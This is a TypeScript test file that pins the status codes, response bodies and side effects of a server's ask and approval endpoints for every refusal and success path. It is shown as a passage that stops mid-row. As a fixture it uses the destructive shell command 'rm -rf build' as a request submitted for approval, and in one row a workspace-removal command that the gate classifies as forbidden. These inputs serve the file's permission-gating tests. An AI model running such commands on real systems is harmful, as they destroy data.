// W3's question-door characterization pin (slug question-census; Task Q3a, ARCH-57 (#792)'s first commit; plan
// 2026-10-26-consolidation-w3-questions.md, §What W3 must not change). Every old answer door keeps its status code
// and body bytes for every refusal and every success, its side effects (row state, watcher door-in, feed row, mail,
// keys pressed) and its auth posture. Q3e moves `POST /api/approvals`'s ladder and Q3f turns the eight answer doors
// into aliases: both run this file UNEDITED (a move commit that edits one of these rows is refused in review).
//
// HOW A ROW READS. Each row is `door | position | what fails`, and its outcome is `(status, body)` with the body as the
// bytes fastify sent (a body over 400 characters is held by its SHA-256, so a screen carried back as `next` is still
// held byte for byte), plus the side effects that door has. Positions are the door's ladder, in today's order. A
// "pair" row fails two consecutive positions at once and answers the earlier one's word, so a reorder shows as a changed
// word, never as a row that still passes. The two cross rows the plan names are here: KILLED AND UNATTRIBUTED (the kill
// switch is read before attribution) and SIGNER MISSING (a valid, attributed, single-box-allowed raise with no signing
// key is `internal`, nothing minted).
//
// WIDTH. The operator doors' press ladders live in `inject/send.ts` and `inject/ask.ts`, which W3 calls and never
// edits (`answer.test.ts`, `answer-text.test.ts`, `answer-multi.test.ts`, `dialog-tab.test.ts`, `ask-route.test.ts`
// hold every one of their refusals). Here each operator door has its front ladder, one press refusal, its success,
// and, for the two that touch a question table, every record arm: no coord, nothing held, held and taken, CAS lost,
// the store refusing and throwing (the operator's press goes through unrecorded, D-2169, D-2545), and approval marking
// before the key, gated on the child's hookstate (none read, an approval envelope, an AskUserQuestion).
// `guard-forbidden` on the rule door is reached only when the classifier answers differently at the rule than at the
// mint; `approvals-routes.test.ts` holds it, and this file does not.
import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import type { LightMyRequestResponse } from 'fastify';
import { askKey } from '../src/askkey.js';
import { buildServer } from '../src/server.js';
import { Tmux } from '../src/exec.js';
import { EXEMPT, needsOriginCheck } from '../src/auth/gate.js';
import { parseDialog } from '../src/pane/dialog.js';
import type { FleetWatcher } from '../src/watch.js';
import { APPROVAL_REFUSALS_LOG, APPROVAL_SIGNING_KEY_FILE } from '../../shared/api.js';
import {
  approvalCount, approvalsFixture, CHILD, CHILD2, DUNE, hookInput, PARENT, requestBody, standardFixture, TOK, TOKEN,
  uuidOf, type Approvals,
} from './approvalsHarness.js';
import { testDeps } from './helpers.js';
import { mkTmp } from './tmpHelpers.js';

const panesDir = path.join(__dirname, 'fixtures', 'panes');
const fixture = (name: string): string => readFileSync(path.join(panesDir, `${name}.txt`), 'utf8');

/** What a door answered: the status, the body's bytes (or `sha256:<hex>` over 400 characters), and its side effects. */
interface Outcome { status: number; body: string; effects: Record<string, unknown> }

const bodyOf = (res: LightMyRequestResponse): string =>
  res.body.length > 400 ? `sha256:${createHash('sha256').update(res.body, 'utf8').digest('hex')}` : res.body;

let fx: Approvals | undefined;
/** Every key and literal pressed into a pane this row, as `<session> <key>` (`Tmux` spied, never reaching a tmux). */
let KEYS: string[] = [];
beforeEach(() => {
  KEYS = [];
  vi.spyOn(Tmux.prototype, 'sendKey').mockImplementation(async (id: string, k: string) => { KEYS.push(`${id} ${k}`); return true; });
  vi.spyOn(Tmux.prototype, 'sendLiteral').mockImplementation(async (id: string, t: string) => { KEYS.push(`${id} -l ${t}`); return true; });
});
const extra: Array<() => Promise<void>> = [];
afterEach(async () => {
  vi.useRealTimers();
  vi.restoreAllMocks();
  if (fx) await fx.close();
  fx = undefined;
  for (const c of extra.splice(0)) await c();
});

/** The four watcher door-ins, spied (calling through), so a row says which the door called and with what. */
const spyDoorIns = (w: FleetWatcher): (() => string[]) => {
  const calls: string[] = [];
  for (const m of ['releaseHeldAsk', 'answeredLate', 'releaseHeldApproval', 'approvalRuled'] as const) {
    const real = (w[m] as (...a: unknown[]) => void).bind(w);
    vi.spyOn(w, m).mockImplementation(((...a: unknown[]) => { calls.push(`${m}(${a.map((x) => JSON.stringify(x)).join(',')})`); real(...a); }) as never);
  }
  return () => [...calls];
};

/** Scripted captures for one session: `capture-pane` answers `panes` in order, the last repeating. */
const script = (f: Approvals, id: string, panes: string[]): void => {
  let i = 0;
  const real = f.panes.get.bind(f.panes);
  f.panes.get = ((k: string) => (k === id ? panes[Math.min(i++, panes.length - 1)] : real(k))) as typeof f.panes.get;
  f.panes.set(id, panes[0]!);
};

const feedTitles = (f: Approvals): string[] => f.coord.feedEvents(50).map((e) => e.title);
const mailTo = (f: Approvals, to: string): number =>
  (f.coord.db.prepare('SELECT COUNT(*) AS n FROM mail m JOIN mail_deliveries d ON d.mailId = m.id WHERE d.toId = ?').get(to) as { n: number }).n;
const askRow = (f: Approvals, id: number): { state: string; answeredBy: string | null; answer: string | null } | null => {
  const r = f.coord.askById(id);
  return r.ok && r.ask !== null ? { state: r.ask.state, answeredBy: r.ask.answeredBy, answer: r.ask.answer } : null;
};
const approvalRow = (f: Approvals, id: number): { state: string; answeredBy: string | null; releaseReason: string | null } | null => {
  const r = f.coord.approvalById(id);
  return r.ok && r.row !== null ? { state: r.row.state, answeredBy: r.row.answeredBy, releaseReason: r.row.releaseReason } : null;
};

// ── The ask the claimant and the operator answer ────────────────────────────────────────────────────────────────

const QUESTION = { question: 'Which colour?', options: [{ label: 'Red' }, { label: 'Blue' }] };
const ASK_KEY = askKey({ questions: [QUESTION] })!;
const ASK_PANE = 'Which colour?\n❯ 1. Red\n  2. Blue\nEnter to select\n';

/** A waiting hookstate for `id` carrying `QUESTION` at `updatedAt` (the stamp the take re-measures, D-2170). */
const hookstate = (f: Approvals, id: string, updatedAt: number, ask: unknown = { questions: [QUESTION] }): void => {
  writeFileSync(path.join(f.home, '.cc-sessions', `${id}.hookstate.json`), JSON.stringify({
    v: 1, state: 'waiting', event: 'PermissionRequest', sessionId: uuidOf(id), pid: 4242, updatedAt, ask, subagents: [],
  }));
};

/** The standard family, the child's ask painted and its hookstate waiting, and one ask row held for the parent. */
const askFixture = async (o: { mint?: 'held' | 'released' | 'none'; releaseReason?: 'parent-not-live' } = {}) => {
  const f = await standardFixture();
  fx = f;
  const now = Date.now();
  hookstate(f, CHILD, now);
  f.panes.set(CHILD, ASK_PANE);
  const doorIns = spyDoorIns(f.watcher);
  const id = o.mint === 'none' ? -1 : f.coord.insertAsk({
    childId: CHILD, parentId: PARENT, runId: f.runId, askKey: ASK_KEY, askAt: now, dialogId: 'dlg-1',
    question: QUESTION.question, options: QUESTION.options.map((x) => x.label), now,
    ...(o.releaseReason === undefined ? {} : { releaseReason: o.releaseReason }),
  });
  return { f, id, now, doorIns, feed0: f.coord.feedEvents(50).length };
};

/** A server with no coordination store: the doors answer `not-configured`, the operator's press goes through plain. */
const noCoordApp = async () => {
  const home = mkTmp('ccrc-doors-nocoord-');
  const reg = path.join(home, '.cc-sessions');
  mkdirSync(reg, { recursive: true });
  for (const [k, v] of Object.entries({ wrapper: 'claude', project: 'project-a', workdir: `/w/project-a/${CHILD}`, uuid: uuidOf(CHILD), started: '1' })) {
    writeFileSync(path.join(reg, `${CHILD}.${k}`), v);
  }
  writeFileSync(path.join(reg, `${CHILD}.hookstate.json`), JSON.stringify({
    v: 1, state: 'waiting', event: 'PermissionRequest', sessionId: uuidOf(CHILD), pid: 4242, updatedAt: Date.now(),
    ask: { questions: [QUESTION] }, subagents: [],
  }));
  const app = await buildServer({ ...testDeps(home, async (_c, args) => {
    if (args[0] === 'capture-pane') return { ran: true, code: 0, stdout: ASK_PANE, stderr: '' };
    return { ran: true, code: 0, stdout: '', stderr: '' };
  }), mailToken: TOKEN });
  extra.push(async () => { await app.close(); });
  return { app };
};

// ── The rows ─────────────────────────────────────────────────────────────────────────────────────────────────────

type Row = readonly [name: string, run: () => Promise<Outcome>];

const askAnswer = (f: Approvals, id: number | string, body: Record<string, unknown>, headers: Record<string, string> = TOK) =>
  f.app.inject({ method: 'POST', url: `/api/asks/${id}/answer`, headers, payload: body });
const askRelease = (f: Approvals, id: number | string, body: Record<string, unknown>, headers: Record<string, string> = TOK) =>
  f.app.inject({ method: 'POST', url: `/api/asks/${id}/release`, headers, payload: body });
const P = { fromId: PARENT, fromUuid: uuidOf(PARENT) };

/** One claimant ask-door row: the response, the row after, the door-ins called, new feed rows and pushes. */
const askOutcome = async (s: Awaited<ReturnType<typeof askFixture>>, res: LightMyRequestResponse, pushes0: number): Promise<Outcome> => ({
  status: res.statusCode, body: bodyOf(res),
  effects: {
    row: s.id === -1 ? null : askRow(s.f, s.id), doorIns: s.doorIns(), keys: [...KEYS],
    feed: feedTitles(s.f).slice(0, s.f.coord.feedEvents(50).length - s.feed0),
    pushes: s.f.sent.slice(pushes0).map((p) => p.tag ?? p.title),
  },
});

const ASK_ANSWER_ROWS: Row[] = [
  ['POST /api/asks/:id/answer | 1 | no coordination store', async () => {
    const { app } = await noCoordApp();
    const res = await app.inject({ method: 'POST', url: '/api/asks/1/answer', headers: TOK, payload: { ...P, optionIndexes: [0] } });
    return { status: res.statusCode, body: bodyOf(res), effects: {} };
  }],
  ['POST /api/asks/:id/answer | 2 | no box token', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }, {}), 0);
  }],
  ['POST /api/asks/:id/answer | 2 | a wrong box token', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }, { 'x-ccrc-mail-token': 'e'.repeat(64) }), 0);
  }],
  ['POST /api/asks/:id/answer | pair 2+3 | no box token and a bad body', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: 7 }, {}), 0);
  }],
  ['POST /api/asks/:id/answer | 3 | a bad body (optionIndexes not numbers)', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: ['0'] }), 0);
  }],
  ['POST /api/asks/:id/answer | 3 | a bad body (askKey not a string)', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0], askKey: 7 }), 0);
  }],
  ['POST /api/asks/:id/answer | pair 3+4 | a bad body from an unknown sender', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: 'project-a-nobody-here', fromUuid: 'u', optionIndexes: 'x' }), 0);
  }],
  ['POST /api/asks/:id/answer | 4 | an unknown sender', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: 'project-a-nobody-here', fromUuid: 'u', optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 4 | a stale uuid', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: PARENT, fromUuid: 'stale', optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | pair 4+5 | a stale uuid on a non-canonical id', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, '01', { fromId: PARENT, fromUuid: 'stale', optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 5 | a non-canonical id', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, '01', { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 6 | the store refuses the read', async () => {
    const s = await askFixture();
    vi.spyOn(s.f.coord, 'askById').mockReturnValueOnce({ ok: false, detail: 'fixture: the asks table is unreadable' } as never);
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 7 | no such ask', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, 99, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 8 | not the stored parent', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: CHILD2, fromUuid: uuidOf(CHILD2), optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | pair 8+9 | not the stored parent, on a row minted released', async () => {
    const s = await askFixture({ releaseReason: 'parent-not-live' });
    return askOutcome(s, await askAnswer(s.f, s.id, { fromId: CHILD2, fromUuid: uuidOf(CHILD2), optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 9 | a row minted released', async () => {
    const s = await askFixture({ releaseReason: 'parent-not-live' });
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 10 | another askKey', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0], askKey: 'deadbeefdeadbeef' }), 0);
  }],
  ['POST /api/asks/:id/answer | 11 | the child unmeasurable (no hookstate)', async () => {
    const s = await askFixture();
    rmSync(path.join(s.f.home, '.cc-sessions', `${CHILD}.hookstate.json`));
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 12 | the CAS lost: the ask moved', async () => {
    const s = await askFixture();
    hookstate(s.f, CHILD, s.now + 5);
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 12 | the CAS lost: declined', async () => {
    const s = await askFixture();
    s.f.coord.declineAsk(s.id, Date.now());
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 12 | the CAS lost: already answered', async () => {
    const s = await askFixture();
    expect(s.f.coord.takeAskForAnswer(s.id, s.now).ok).toBe(true);
    s.f.coord.settleAsk(s.id, 'operator', 'Red', Date.now());
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 12 | the CAS lost: already answering', async () => {
    const s = await askFixture();
    expect(s.f.coord.takeAskForAnswer(s.id, s.now).ok).toBe(true);
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
  ['POST /api/asks/:id/answer | 13 | the press refused (out of range): the take is rolled back', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [5] }), 0);
  }],
  ['POST /api/asks/:id/answer | success | a held ask: pressed, recorded, settled, no late replace', async () => {
    const s = await askFixture();
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [1], askKey: ASK_KEY }), 0);
  }],
  ['POST /api/asks/:id/answer | success | after the lapse released it: the late answer replaces the lapse (D-5289)', async () => {
    const s = await askFixture();
    expect(s.f.coord.releaseAsk(s.id, Date.now())).toBe(true);
    return askOutcome(s, await askAnswer(s.f, s.id, { ...P, optionIndexes: [0] }), 0);
  }],
];

const ASK_RELEASE_ROWS: Row[] = [
  ['POST /api/asks/:id/release | 1 | no coordination store', async () => {
    const { app } = await noCoordApp();
    const res = await app.inject({ method: 'POST', url: '/api/asks/1/release', headers: TOK, payload: P });
    return { status: res.statusCode, body: bodyOf(res), effects: {} };
  }],
  ['POST /api/asks/:id/release | 2 | no box token', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, P, {}), 0);
  }],
  ['POST /api/asks/:id/release | pair 2+3 | no box token and a bad body', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, {}, {}), 0);
  }],
  ['POST /api/asks/:id/release | 3 | a bad body', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, { fromId: PARENT }), 0);
  }],
  ['POST /api/asks/:id/release | 4 | an unknown sender', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, { fromId: 'project-a-nobody-here', fromUuid: 'u' }), 0);
  }],
  ['POST /api/asks/:id/release | 4 | a stale uuid', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, { fromId: PARENT, fromUuid: 'stale' }), 0);
  }],
  ['POST /api/asks/:id/release | pair 4+5 | a stale uuid on a non-canonical id', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, '1.0', { fromId: PARENT, fromUuid: 'stale' }), 0);
  }],
  ['POST /api/asks/:id/release | 5 | a non-canonical id', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, '1.0', P), 0);
  }],
  ['POST /api/asks/:id/release | 6 | the store refuses the read', async () => {
    const s = await askFixture();
    vi.spyOn(s.f.coord, 'askById').mockReturnValueOnce({ ok: false, detail: 'fixture: the asks table is unreadable' } as never);
    return askOutcome(s, await askRelease(s.f, s.id, P), 0);
  }],
  ['POST /api/asks/:id/release | 7 | no such ask', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, 99, P), 0);
  }],
  ['POST /api/asks/:id/release | 8 | not the stored parent', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, { fromId: CHILD2, fromUuid: uuidOf(CHILD2) }), 0);
  }],
  ['POST /api/asks/:id/release | 9 | not held (already answered)', async () => {
    const s = await askFixture();
    expect(s.f.coord.takeAskForAnswer(s.id, s.now).ok).toBe(true);
    s.f.coord.settleAsk(s.id, 'operator', 'Red', Date.now());
    return askOutcome(s, await askRelease(s.f, s.id, P), 0);
  }],
  ['POST /api/asks/:id/release | success | declined, and the door-in fires (nothing held in memory: no push)', async () => {
    const s = await askFixture();
    return askOutcome(s, await askRelease(s.f, s.id, P), 0);
  }],
];

// ── Approvals: the raise, the rule and the release ───────────────────────────────────────────────────────────────

const ORDINARY = hookInput({ command: 'rm -rf build' });

/** One approvals row: the response, the rows minted, the first row after, door-ins, mail to the parent, the journal. */
const approvalOutcome = async (f: Approvals, res: LightMyRequestResponse, doorIns: () => string[], o: { rowId?: number; mail0?: number } = {}): Promise<Outcome> => {
  const journal = path.join(f.home, '.ccrc', APPROVAL_REFUSALS_LOG);
  return {
    status: res.statusCode, body: bodyOf(res),
    effects: {
      minted: approvalCount(f.coord), row: approvalRow(f, o.rowId ?? 1), doorIns: doorIns(),
      mailToParent: mailTo(f, PARENT) - (o.mail0 ?? 0),
      journal: existsSync(journal) ? readFileSync(journal, 'utf8').replace(/^\d+ /gm, '<now> ') : null,
    },
  };
};

const fam = async (o: { role?: 'server' | 'both' } = {}) => {
  const f = await standardFixture(o);
  fx = f;
  return { f, doorIns: spyDoorIns(f.watcher) };
};
const KILL = (f: Approvals): void => writeFileSync(path.join(f.home, '.cc-sessions', 'approvals-disabled'), '');
const NO_SIGNER = async (f: Approvals): Promise<void> => {
  writeFileSync(path.join(f.home, '.ccrc', APPROVAL_SIGNING_KEY_FILE), 'not a key\n', { mode: 0o600 });
  await f.restart();
};
const runsUnreadable = (f: Approvals): void => {
  vi.spyOn(f.coord, 'run').mockReturnValue({ ok: false, detail: 'fixture: the runs table is unreadable' } as never);
};

const RAISE_ROWS: Row[] = [
  ['POST /api/approvals | 1 notConfigured | no coordination store', async () => {
    const { app } = await noCoordApp();
    const res = await app.inject({ method: 'POST', url: '/api/approvals', headers: TOK, payload: requestBody(ORDINARY) });
    return { status: res.statusCode, body: bodyOf(res), effects: {} };
  }],
  ['POST /api/approvals | 2 401 | no box token', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.app.inject({ method: 'POST', url: '/api/approvals', payload: requestBody(ORDINARY) }), doorIns);
  }],
  ['POST /api/approvals | pair 2+3 | no box token and a bad body', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.app.inject({ method: 'POST', url: '/api/approvals', payload: { v: 2 } }), doorIns);
  }],
  ['POST /api/approvals | 3 bad-request | no nonce', async () => {
    const { f, doorIns } = await fam();
    const { nonce: _n, ...b } = requestBody(ORDINARY);
    return approvalOutcome(f, await f.request(b), doorIns);
  }],
  ['POST /api/approvals | 3 bad-request | both canonical and truncated', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), truncated: true }), doorIns);
  }],
  ['POST /api/approvals | pair 3+4 | a bad body on a killed lane', async () => {
    const { f, doorIns } = await fam();
    KILL(f);
    return approvalOutcome(f, await f.request({ v: 1 }), doorIns);
  }],
  ['POST /api/approvals | 4 approvals-disabled | the fleet box marker', async () => {
    const { f, doorIns } = await fam();
    KILL(f);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 4 approvals-disabled | the server box marker', async () => {
    const { f, doorIns } = await fam();
    writeFileSync(path.join(f.home, '.ccrc', 'approvals-disabled'), '');
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 4 approvals-disabled | an unlistable registry fails shut', async () => {
    const { f, doorIns } = await fam();
    rmSync(path.join(f.home, '.cc-sessions'), { recursive: true, force: true });
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | cross | KILLED AND UNATTRIBUTED: the kill switch is read first', async () => {
    const { f, doorIns } = await fam();
    KILL(f);
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), sessionUuid: 'stale' }), doorIns);
  }],
  ['POST /api/approvals | 5 attribution | an unknown sender', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(ORDINARY, 'project-a-nobody-here')), doorIns);
  }],
  ['POST /api/approvals | 5 attribution | a stale uuid', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), sessionUuid: 'stale' }), doorIns);
  }],
  ['POST /api/approvals | pair 5+6 | a stale uuid on a single box', async () => {
    const { f, doorIns } = await fam({ role: 'both' });
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), sessionUuid: 'stale' }), doorIns);
  }],
  ['POST /api/approvals | 6 single-box | role both without the opt-in', async () => {
    const { f, doorIns } = await fam({ role: 'both' });
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | pair 6+7 | a single box with no signing key', async () => {
    const { f, doorIns } = await fam({ role: 'both' });
    await NO_SIGNER(f);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | cross | SIGNER MISSING: valid, attributed, allowed here, no key: internal, nothing minted', async () => {
    const { f, doorIns } = await fam();
    await NO_SIGNER(f);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | pair 7+8 | no signing key, for a session that is not a child', async () => {
    const { f, doorIns } = await fam();
    await NO_SIGNER(f);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY, DUNE)), doorIns);
  }],
  ['POST /api/approvals | 8 not-a-child | no child mark', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(ORDINARY, DUNE)), doorIns);
  }],
  ['POST /api/approvals | pair 8+9 | not a child, and no deny file engaged', async () => {
    const { f, doorIns } = await fam();
    rmSync(path.join(f.home, '.cc-sessions', 'child-deny.settings.json'));
    return approvalOutcome(f, await f.request(requestBody(ORDINARY, DUNE)), doorIns);
  }],
  ['POST /api/approvals | 9 deny-not-engaged | no deny digest on the child', async () => {
    const { f, doorIns } = await fam();
    f.child(CHILD, (f as Approvals & { runId: number }).runId, { deny: null });
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | pair 9+10 | no deny digest, on an unverified version', async () => {
    const f = await approvalsFixture();
    fx = f;
    const doorIns = spyDoorIns(f.watcher);
    f.seed(PARENT, 'project-a');
    f.seed(CHILD, 'project-a', '2.1.299');
    f.child(CHILD, f.run(PARENT, CHILD), { deny: null });
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 10 version-unverified | 2.1.299', async () => {
    const f = await approvalsFixture();
    fx = f;
    const doorIns = spyDoorIns(f.watcher);
    f.seed(PARENT, 'project-a');
    f.seed(CHILD, 'project-a', '2.1.299');
    f.child(CHILD, f.run(PARENT, CHILD));
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | pair 10+11 | an unverified version and a digest that does not match', async () => {
    const f = await approvalsFixture();
    fx = f;
    const doorIns = spyDoorIns(f.watcher);
    f.seed(PARENT, 'project-a');
    f.seed(CHILD, 'project-a', '2.1.299');
    f.child(CHILD, f.run(PARENT, CHILD));
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), digest: 'a'.repeat(64) }), doorIns);
  }],
  ['POST /api/approvals | 11 digest-mismatch | the digest does not match, and the journal line', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), digest: 'a'.repeat(64) }), doorIns);
  }],
  ['POST /api/approvals | pair 11+12 | a digest mismatch while the runs are unreadable', async () => {
    const { f, doorIns } = await fam();
    runsUnreadable(f);
    return approvalOutcome(f, await f.request({ ...requestBody(ORDINARY), digest: 'a'.repeat(64) }), doorIns);
  }],
  ['POST /api/approvals | 12 run-unreadable | heldFor throws', async () => {
    const { f, doorIns } = await fam();
    runsUnreadable(f);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 13 not-a-child | heldFor\'s verdict (the mark names no run)', async () => {
    const { f, doorIns } = await fam();
    f.child(CHILD2, 999);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY, CHILD2)), doorIns);
  }],
  ['POST /api/approvals | 14 approval-released | truncated', async () => {
    const { f, doorIns } = await fam();
    const { canonical: _c, ...b } = requestBody(ORDINARY);
    return approvalOutcome(f, await f.request({ ...b, truncated: true }), doorIns);
  }],
  ['POST /api/approvals | 14 approval-released | unparseable (the input is not an object)', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(hookInput({ toolInput: ['rm'] as never }))), doorIns);
  }],
  ['POST /api/approvals | 14 approval-released | the claimant rule: the parent is not live', async () => {
    const { f, doorIns } = await fam();
    f.gone.add(PARENT);
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 14 approval-released | the claimant rule: no claimant on the run', async () => {
    const f = await approvalsFixture();
    fx = f;
    const doorIns = spyDoorIns(f.watcher);
    f.seed(PARENT, 'project-a');
    f.seed(CHILD, 'project-a');
    f.child(CHILD, f.run(null, CHILD));
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 14 approval-released | forbidden: minted released, never mailed', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(hookInput({ command: 'ccd ws-rm project-a-still-cove' }))), doorIns);
  }],
  ['POST /api/approvals | 15 201 | minted held for the claimant, mailed', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(ORDINARY)), doorIns);
  }],
  ['POST /api/approvals | 15 201 | a subagent\'s request (its own window)', async () => {
    const { f, doorIns } = await fam();
    return approvalOutcome(f, await f.request(requestBody(hookInput({ agentId: 'a0000000000000001' }))), doorIns);
  }],
];

/** A held row minted through the raise for the rule and release rows (row 1), with the mail it sent counted. */
const minted = async (o: { role?: 'server' | 'both'; input?: Record<string, unknown> } = {}) => {
  const { f, doorIns } = await fam(o);
  if (o.role === 'both') writeFileSync(path.join(f.home, '.ccrc', 'approvals-single-box'), '');
  const res = await f.request(requestBody(o.input ?? ORDINARY));
  const id = (res.json() as { id: number }).id;
  return { f, doorIns, id, mail0: mailTo(f, PARENT) };
};
const rule = (f: Approvals, id: number | string, body: Record<string, unknown>, headers: Record<string, string> = TOK) =>
  f.app.inject({ method: 'POST', url: `/api/approvals/${id}/rule`, headers, payload: body });
const RULE = { ...P, verdict: 'allow', reason: 'a cleanup inside your worktree' };
const DENY = { ...P, verdict: 'deny', reason: 'not this one' };

const RULE_ROWS: Row[] = [
  ['POST /api/approvals/:id/rule | 1 | no coordination store', async () => {
    const { app } = await noCoordApp();
    const res = await app.inject({ method: 'POST', url: '/api/approvals/1/rule', headers: TOK, payload: RULE });
    return { status: res.statusCode, body: bodyOf(res), effects: {} };
  }],
  ['POST /api/approvals/:id/rule | 2 | no box token', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE, {}), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 2+3 | no box token and a widening field', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, permanent: true }, {}), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 3 | a widening field (permanent)', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, permanent: true }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 3 | a widening field (updatedPermissions)', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, updatedPermissions: [] }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 3 | a widening field (mode)', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, mode: 'acceptEdits' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 3+4 | a widening field on a bad body', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { mode: 'x', verdict: 'maybe' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 4 | a bad body (an empty reason)', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, reason: '  ' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 4 | a bad body (verdict maybe)', async () => {
    const m = await minted();
